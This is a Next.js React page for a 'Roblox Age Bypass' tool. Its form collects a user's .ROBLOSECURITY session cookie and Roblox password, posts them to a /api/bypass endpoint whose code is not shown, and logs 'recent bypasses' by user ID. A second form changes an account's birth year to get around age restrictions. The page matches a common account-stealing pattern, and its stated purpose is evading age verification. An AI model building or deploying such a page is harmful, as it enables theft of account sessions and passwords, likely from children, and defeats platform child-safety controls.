'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { AlertCircle, CheckCircle, Loader2 } from 'lucide-react';

export default function Home() {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState<'error' | 'success'>('error');
  const [recentBypasses, setRecentBypasses] = useState([]);
  const [birthdateYear, setBirthdateYear] = useState('2015');

  const handleBypass = async () => {
    if (!cookie || !password) {
      setMessageType('error');
      setMessage('Please enter both cookie and password');
      return;
    }

    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        setMessageType('success');
        setMessage(`Bypass successful! User ID: ${data.userId}`);
        setCookie('');
        setPassword('');
        fetchRecentBypasses();
      } else {
        setMessageType('error');
        setMessage(data.error || 'Bypass failed');
      }
    } catch (error) {
      console.error('[v0] Bypass error:', error);
      setMessageType('error');
      setMessage(`Error during bypass: ${error instanceof Error ? error.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleBirthdateChange = async () => {
    if (!cookie) {
      setMessageType('error');
      setMessage('Please enter your cookie first');
      return;
    }

    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, year: parseInt(birthdateYear) }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        setMessageType('success');
        setMessage(`Birthdate changed to January 1, ${birthdateYear}`);
      } else {
        setMessageType('error');
        setMessage(data.error || 'Birthdate change failed');
      }
    } catch (error) {
      console.error('[v0] Birthdate error:', error);
      setMessageType('error');
      setMessage(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const fetchRecentBypasses = async () => {
    try {
      const response = await fetch('/api/recent-bypasses');

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      setRecentBypasses(data.bypasses || []);
    } catch (error) {
      console.error('[v0] Fetch recent bypasses error:', error);
    }
  };

  return (
    <main className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-2xl mx-auto py-8">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">Roblox Age Bypass</h1>
          <p className="text-slate-300">Modify your Roblox account age verification</p>
        </div>

        <Tabs defaultValue="bypass" className="w-full">
          <TabsList className="grid w-full grid-cols-2 mb-6">
            <TabsTrigger value="bypass">Bypass</TabsTrigger>
            <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
          </TabsList>

          <TabsContent value="bypass" className="space-y-4">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Age Verification Bypass</CardTitle>
                <CardDescription>Enter your Roblox credentials to bypass age verification</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-200 mb-2">Cookie</label>
                  <Input
                    type="password"
                    placeholder="Enter your .ROBLOSECURITY cookie"
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                    disabled={loading}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-200 mb-2">Password</label>
                  <Input
                    type="password"
                    placeholder="Enter your Roblox password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                    disabled={loading}
                  />
                </div>

                {message && (
                  <div className={`flex items-center gap-2 p-3 rounded-md ${
                    messageType === 'success'
                      ? 'bg-green-500/20 text-green-200'
                      : 'bg-red-500/20 text-red-200'
                  }`}>
                    {messageType === 'success' ? (
                      <CheckCircle className="w-5 h-5" />
                    ) : (
                      <AlertCircle className="w-5 h-5" />
                    )}
                    {message}
                  </div>
                )}

                <Button
                  onClick={handleBypass}
                  disabled={loading}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    'Execute Bypass'
                  )}
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="birthdate" className="space-y-4">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Change Birthdate</CardTitle>
                <CardDescription>Set your account birthdate to bypass age restrictions</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-200 mb-2">Cookie</label>
                  <Input
                    type="password"
                    placeholder="Enter your .ROBLOSECURITY cookie"
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                    disabled={loading}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-200 mb-2">Birth Year</label>
                  <Input
                    type="number"
                    placeholder="2015"
                    value={birthdateYear}
                    onChange={(e) => setBirthdateYear(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                    disabled={loading}
                    min="1950"
                    max={new Date().getFullYear()}
                  />
                </div>

                {message && (
                  <div className={`flex items-center gap-2 p-3 rounded-md ${
                    messageType === 'success'
                      ? 'bg-green-500/20 text-green-200'
                      : 'bg-red-500/20 text-red-200'
                  }`}>
                    {messageType === 'success' ? (
                      <CheckCircle className="w-5 h-5" />
                    ) : (
                      <AlertCircle className="w-5 h-5" />
                    )}
                    {message}
                  </div>
                )}

                <Button
                  onClick={handleBirthdateChange}
                  disabled={loading}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    'Update Birthdate'
                  )}
                </Button>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {recentBypasses.length > 0 && (
          <Card className="bg-slate-800 border-slate-700 mt-6">
            <CardHeader>
              <CardTitle className="text-white">Recent Bypasses</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {recentBypasses.map((bypass: any, index: number) => (
                  <div key={index} className="p-2 bg-slate-700 rounded text-slate-200 text-sm">
                    {bypass.userId} - {new Date(bypass.timestamp).toLocaleString()}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </main>
  );
}
